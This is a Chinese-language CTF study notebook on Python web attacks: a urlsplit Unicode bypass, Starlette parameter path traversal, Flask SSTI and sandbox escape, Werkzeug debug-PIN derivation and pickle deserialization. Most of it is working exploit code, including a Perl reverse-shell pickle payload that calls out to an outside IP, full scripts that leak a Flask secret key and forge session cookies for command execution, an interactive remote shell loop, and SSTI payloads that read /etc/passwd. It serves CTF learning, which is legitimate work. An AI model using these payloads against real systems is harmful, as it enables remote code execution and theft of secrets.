# Python

# Python

## 编码

[url中的unicode漏洞引发的域名安全问题](https://xz.aliyun.com/t/6070)

### CVE-2019-9636：urlsplit不处理NFKC标准化

```python
from urllib.parse import urlparse,urlunsplit,urlsplit
from urllib import parse
def get_unicode():
    for x in range(65536):
        uni=chr(x)
        url="http://suctf.c{}".format(uni)
        try:
            if getUrl(url):
                print("str: "+uni+' unicode: \\u'+str(hex(x))[2:])
        except:
            pass

def getUrl(url):
    url = url
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return False
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return False
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return True
    else:
        return False

if __name__=="__main__":
    get_unicode()
```

- ℂ是替代c
- ℆转码后是c/u
    
    ![Untitled](Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled.png)
    

然后目录穿越拿flag

**NFKC**

?url=file:////suctf.cc/etc/passwd

### ****[LineCTF2022]Memo Driver****

### CVE-2021-23336

```python
from starlette.testclient import TestClient
from starlette.requests import Request
from starlette.applications import Starlette
from starlette.routing import Route
from starlette.responses import PlainTextResponse

param_value = 'a;b;c'
url = f'/test?param={param_value}'

async def test_route(request: Request):
    param = request.query_params['param']  
    # param is 'a' 
    # request.query_params.keys() is ['param', 'b', 'c']
    assert param == param_value  # Assertion failed
    return PlainTextResponse(param)

app = Starlette(debug=True, routes=[Route('/test', test_route)])

client = TestClient(app)

response = client.request(url=url, method='GET')

```

[https://github.com/encode/starlette/issues/1325](https://github.com/encode/starlette/issues/1325)

利用query_params的错误解析当value值以;分割后，query_params会截取;前半截，而query_params.keys()会将key和a;后面的b,c当做key

那么就可以利用这个特性来传入文件路径

在save那里填一个wumonster然后save下面就会有一个链接跳转

![Untitled](Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%201.png)

![Untitled](Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%202.png)

这样这里就有了ClientId   67eb9cc01b6d566e811945ab5b376ac5

这是大抵的运行流程，那么我们只需要利用;构造好内容就可以去访问flag了

![Untitled](Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%203.png)

flag的路径应该是./memo/67eb9cc01b6d566e811945ab5b376ac5/../flag

将参数构造为  veiw?67eb9cc01b6d566e811945ab5b376ac5=flag;/..

view中的query_params会只拿到值flag

即filename = request.query_params[clientId] → filename=’flag’

但是request.query_params 中还有[(’67eb9cc01b6d566e811945ab5b376ac5’,’flag’),(’/..’,’’)]

request.query_params.keys()有两个key值连在一起 `67eb9cc01b6d566e811945ab5b376ac5/..`

所以path的值就是../memo/67eb9cc01b6d566e811945ab5b376ac5/../flag

这样构造路径就可以访问到flag

![Untitled](Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%204.png)

本来想着往上穿几层看看，结果还是一样的

![Untitled](Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%205.png)

## pickle反序列化

### ****[Zer0pts2020]notepad(ssti+python反序列化)****

app.py

```python
import flask
import flask_bootstrap
import os
import pickle
import base64
import datetime

app = flask.Flask(__name__)
app.secret_key = os.urandom(16)
bootstrap = flask_bootstrap.Bootstrap(app)

@app.route('/', methods=['GET'])
def index():
    return notepad(0)

@app.route('/note/<int:nid>', methods=['GET'])
def notepad(nid=0):
    data = load()
    
    if not 0 <= nid < len(data):
        nid = 0
    
    return flask.render_template('index.html', data=data, nid=nid)

@app.route('/new', methods=['GET'])
def new():
    """ Create a new note """
    data = load()
    data.append({"date": now(), "text": "", "title": "*New Note*"})
    flask.session['savedata'] = base64.b64encode(pickle.dumps(data))
    
    return flask.redirect('/note/' + str(len(data) - 1))

@app.route('/save/<int:nid>', methods=['POST'])
def save(nid=0):
    """ Update or append a note """
    if 'text' in flask.request.form and 'title' in flask.request.form:
        title = flask.request.form['title']
        text = flask.request.form['text']
        data = load()
        
        if 0 <= nid < len(data):
            data[nid] = {"date": now(), "text": text, "title": title}
        else:
            data.append({"date": now(), "text": text, "title": title})
        
        flask.session['savedata'] = base64.b64encode(pickle.dumps(data))
    else:
        return flask.redirect('/')
    
    return flask.redirect('/note/' + str(len(data) - 1))

@app.route('/delete/<int:nid>', methods=['GET'])
def delete(nid=0):
    """ Delete a note """
    data = load()

    if 0 <= nid < len(data):
        data.pop(nid)
    if len(data) == 0:
        data = [{"date": now(), "text": "", "title": "*New Note*"}]
    
    flask.session['savedata'] = base64.b64encode(pickle.dumps(data))
    
    return flask.redirect('/')

@app.route('/reset', methods=['GET'])
def reset():
    """ Remove every note """
    flask.session['savedata'] = None
    
    return flask.redirect('/')

@app.route('/favicon.ico', methods=['GET'])
def favicon():
    return ''

@app.errorhandler(404)
def page_not_found(error):
    """ Automatically go back when page is not found """
    referrer = flask.request.headers.get("Referer")
    
    if referrer is None: referrer = '/'
    if not valid_url(referrer): referrer = '/'
    
    html = '<html><head><meta http-equiv="Refresh" content="3;URL={}"><title>404 Not Found</title></head><body>Page not found. Redirecting...</body></html>'.format(referrer)
    
    return flask.render_template_string(html), 404

def valid_url(url):
    """ Check if given url is valid """
    host = flask.request.host_url
    
    if not url.startswith(host): return False  # Not from my server
    if len(url) - len(host) > 16: return False # Referer may be also 404
    
    return True

def load():
    """ Load saved notes """
    try:
        savedata = flask.session.get('savedata', None)
        data = pickle.loads(base64.b64decode(savedata))
    except:
        data = [{"date": now(), "text": "", "title": "*New Note*"}]
    
    return data

def now():
    """ Get current time """
    return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

if __name__ == '__main__':
    app.run(
        host = '0.0.0.0',
        port = '8001',
        debug=False
    )
```

在404里有一个SSTI

在Referer中进行SSTI，但是在404的路由中调用了vaild_url(referer)限制了长度为16所以就只能构造{{config}}

[https://www.notion.so](https://www.notion.so)

<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': b'\xef\xca;\x11._ \x81)\xea\x16\xbb\x9a\xb5\xbe\x0e', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'BOOTSTRAP_USE_MINIFIED': True, 'BOOTSTRAP_CDN_FORCE_SSL': False, 'BOOTSTRAP_QUERYSTRING_REVVING': True, 'BOOTSTRAP_SERVE_LOCAL': False, 'BOOTSTRAP_LOCAL_SUBDOMAIN': None}>

但是在源码中还存在一个地方，可以进行pickle反序列化

![Untitled](Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%206.png)

拿别人的exp生成一下，也记录一下这种弹shell方式

```python
import pickle
import base64
import os
class Person(object):
    def __reduce__(self):
        return (os.system,("""perl -e 'use Socket;$i="174.1.231.162";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""",))
admin=Person()
print(base64.b64encode(pickle.dumps(admin)))
```

然后用flask_cookie_session_manager来处理最后把cookie带上就好

![Untitled](Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%207.png)

SECRET_KEY中的不可见字符极大的影响了操作这里贴一下官方的脚本，纯python处理

```python
# coding: utf-8
import re
import base64
import hashlib
import pickle
import requests
import os
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

host = os.getenv("HOST", 'fa6bdc63-af9b-497c-9456-dda2e6c9ac2f.node4.buuoj.cn')
port = os.getenv("PORT", '81')
url_new = "http://{}:{}/new".format(host, port)
url_note = "http://{}:{}/note/0".format(host, port)
url_404 = "http://{}:{}/qwerty".format(host, port)
url_referer = "http://{}:{}/{{{{config}}}}".format(host, port)

# leak the secret key
r = requests.get(url_404, headers={'referer': url_referer})
result = re.findall(b"SECRET_KEY&#39;: b&#39;(.+)&#39;, &#39;PERMANENT_SESSION_LIFETIME", r.text.encode("ascii"))
key = eval(b'b"' + result[0] + b'"')

# get a valid session
r = requests.get(url_new, allow_redirects=False)
session = r.cookies.get("session")

# decode
serializer = TaggedJSONSerializer()
signer_kwargs = {
    'key_derivation': 'hmac',
    'digest_method': hashlib.sha1
}
s = URLSafeTimedSerializer(
    key,
    salt='cookie-session',
    serializer=serializer,
    signer_kwargs=signer_kwargs
)
data = s.loads(session)

cmd = ["ls", "-l"]
# inject
class Evil(object):
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (self.cmd, ))
evil = [
    {"date": "", "text": "", "title": Evil(cmd)}
]
data['savedata'] = base64.b64encode(pickle.dumps(evil))
# generate
cookies = {
    "session": s.dumps(data)
}
r = requests.get(url_note, cookies=cookies)
```

这个是可以拿到交互式的shell

```python
# coding: utf-8
import re
import base64
import hashlib
import pickle
import requests
import os
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

host = os.getenv("HOST", 'fa6bdc63-af9b-497c-9456-dda2e6c9ac2f.node4.buuoj.cn')
port = os.getenv("PORT", '81')
url_new = "http://{}:{}/new".format(host, port)
url_note = "http://{}:{}/note/0".format(host, port)
url_404 = "http://{}:{}/qwerty".format(host, port)
url_referer = "http://{}:{}/{{{{config}}}}".format(host, port)

# leak the secret key
r = requests.get(url_404, headers={'referer': url_referer})
result = re.findall(b"SECRET_KEY&#39;: b&#39;(.+)&#39;, &#39;PERMANENT_SESSION_LIFETIME", r.text.encode("ascii"))
key = eval(b'b"' + result[0] + b'"')

# get a valid session
r = requests.get(url_new, allow_redirects=False)
session = r.cookies.get("session")

# decode
serializer = TaggedJSONSerializer()
signer_kwargs = {
    'key_derivation': 'hmac',
    'digest_method': hashlib.sha1
}
s = URLSafeTimedSerializer(
    key,
    salt='cookie-session',
    serializer=serializer,
    signer_kwargs=signer_kwargs
)
data = s.loads(session)

while True:
    print("$ ", end="")
    cmd = input().split()
    # inject
    class Evil(object):
        def __init__(self, cmd):
            self.cmd = cmd
        def __reduce__(self):
            import subprocess
            return (subprocess.check_output, (self.cmd, ))
    evil = [
        {"date": "", "text": "", "title": Evil(cmd)}
    ]
    data['savedata'] = base64.b64encode(pickle.dumps(evil))
    # generate
    cookies = {
        "session": s.dumps(data)
    }
    r = requests.get(url_note, cookies=cookies)
    result = re.findall(b"title\" value=\"b&#39;(.+)&#39;\"><br>", r.text.encode("ascii"))
    print(result)
```

## 沙箱逃逸

- 利用python对象间的引用关系来调用被禁用的对象

### ****[WesternCTF2018]shrine****

```python
import flask
import os
 
app = flask.Flask(__name__)
 
app.config['FLAG'] = os.environ.pop('FLAG')
 
@app.route('/')
def index():
    return open(__file__).read()
 
@app.route('/shrine/<path:shrine>')
def shrine(shrine):
 
    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
 
    return flask.render_template_string(safe_jinja(shrine))
 
if __name__ == '__main__':
    app.run(debug=True)
```

读取全局变量

- url_for
- get_flashed_messages

![Untitled](Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%208.png)

这样就可以绕过沙箱调用config了

![Untitled](Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%209.png)

## PIN码

### ****[GYCTF2020]FlaskApp****

ssti报错说明开启了debug

![Untitled](Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%2010.png)

- 文件位置 报错界面就有
    - **/usr/local/lib/python3.7/site-packages/flask/app.py**
- flask登录的用户名
    - {{().__class__.__bases__[0].__subclasses__()[75].__init__.___globals__.__builtins__['open'](’/etc/passwd’).read()}}
    - flaskweb
    
    ![Untitled](Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%2011.png)
    
- 读/sys/class/net/eth0/address拿mac
    - 86:ce:74:4e:b9:3e  要转为10进制
- docker环境，因此读机器id需要读/proc/self/cgroup
    - 2f6c7c562dde90a54aadbbf3f0fb4f53053cb1a8694517af60ff8d93018351eb

pin：615-606-273

传入后rce

![Untitled](Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%2012.png)

其他解：

直接ssti

- {{''.__class__.__bases__[0].__subclasses__()[75].__init__.___globals__['__builtins__'][['](notion://www.notion.so/'o'+'s')imp'+'ort['](notion://www.notion.so/'o'+'s')].listdir('/')}}
- {% for c in []__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}{% endif %}{% endfor %}